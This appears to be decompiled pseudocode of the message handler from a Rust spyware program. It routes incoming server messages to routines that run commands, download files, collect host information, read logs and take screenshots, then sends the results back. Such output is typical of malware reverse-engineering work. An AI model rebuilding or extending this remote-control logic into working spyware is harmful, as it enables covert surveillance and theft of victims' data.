fn spyware::communication::server::handle_message(a0: i64, a1: u64) -> int {
    let v0: struct40;  // [bp-0x338], Other Possible Types: u128
    let v1: u64;  // [bp-0x328]
    let v2: struct40;  // [bp-0x300]
    let v3: struct24;  // [bp-0x2d8]
    let v4: struct32;  // [bp-0x2b8]
    let v5: struct64;  // [bp-0x298]
    let v6: struct64;  // [bp-0x258]
    let v7: struct64;  // [bp-0x218]
    let v8: struct64;  // [bp-0x1d8]
    let v9: struct52;  // [bp-0x198]
    let v10: u128;  // [bp-0x188]
    let v11: u128;  // [bp-0x178]
    let v12: u64;  // [bp-0x168]
    let v13: struct52;  // [bp-0x160]
    let v14: u128;  // [bp-0x150]
    let v15: u128;  // [bp-0x140]
    let v16: u64;  // [bp-0x130]
    let v17: struct52;  // [bp-0x128]
    let v18: u128;  // [bp-0x118]
    let v19: u128;  // [bp-0x108]
    let v20: u64;  // [bp-0xf8]
    let v21: struct32;  // [bp-0xf0]
    let v22: u128;  // [bp-0xe0]
    let v23: u128;  // [bp-0xd0]
    let v24: u64;  // [bp-0xc0]
    let v25: struct64;  // [bp-0xb8]
    let v26: struct24;  // [bp-0x70]
    let v27: struct64;  // [bp-0x70]
    let v33: u64;  // rax

    match (*(a0 as &i64) ^ 0x8000000000000000) {
        0 => {
            v4 = struct32 {
                field_0: *((a0 + 8) as &i128)
                field_16: *((a0 + 24) as &i128)
            };
            v9 = spyware::actions::commands::run_command_message(&v4);
            v5 = struct64 {
                field_0: 9223372036854775809
                field_8: v9.field_0
                field_24: v10
                field_40: v11
                field_56: v12
            };
            core::result::Result<T,E>::unwrap(spyware::communication::server::send_response(&v5 as u32, a1), "src/communication/server.rs");
        }
        1 | 3 | 5 | 7 => {
            break;
        }
        2 => {
            v3 = struct24 {
                field_0: *((a0 + 8) as &i128)
                field_16: *((a0 + 24) as &i64)
            };
            v13 = spyware::actions::basic_info::download_file_message(&v3);
            v6 = struct64 {
                field_0: 9223372036854775811
                field_8: v13.field_0
                field_24: v14
                field_40: v15
                field_56: v16
            };
            core::result::Result<T,E>::unwrap(spyware::communication::server::send_response(&v6 as u32, a1), "src/communication/server.rs");
        }
        4 => {
            v1 = *((a0 + 24) as &i64);
            v0 = *((a0 + 8) as &i128);
            v26 = spyware::actions::basic_info::get_basic_info_request();
            v25 = v27;
            core::result::Result<T,E>::unwrap(spyware::communication::server::send_response(&v25 as u32, a1), "src/communication/server.rs");
        }
        6 => {
            v17 = spyware::actions::log_actions::get_logs_request();
            v7 = struct64 {
                field_0: 9223372036854775815
                field_8: v17.field_0
                field_24: v18
                field_40: v19
                field_56: v20
            };
            v33 = spyware::communication::server::send_response(&v7 as u32, a1);
        }
        8 => {
            v21 = spyware::actions::screenshot_actions::get_screenshot_request();
            v8 = struct64 {
                field_0: 9223372036854775817
                field_8: v21.field_0
                field_24: v22
                field_40: v23
                field_56: v24
            };
            v33 = spyware::communication::server::send_response(&v8 as u32, a1);
        }
        _ => {
            if core::sync::atomic::atomic_load() {
                v0 = struct40 {
                    field_0: "Unrecognized message type"
                    field_8: 1
                    field_16: 8
                    field_24: 0
                };
                v2 = struct40 {
                    field_0: "spyware::communication::server"
                    field_16: "spyware::communication::server"
                    field_32: log::__private_api::loc("src/communication/server.rs")
                };
                log::__private_api::log(&v0, 1, &v2);
            }
        }
    }
    return;
}
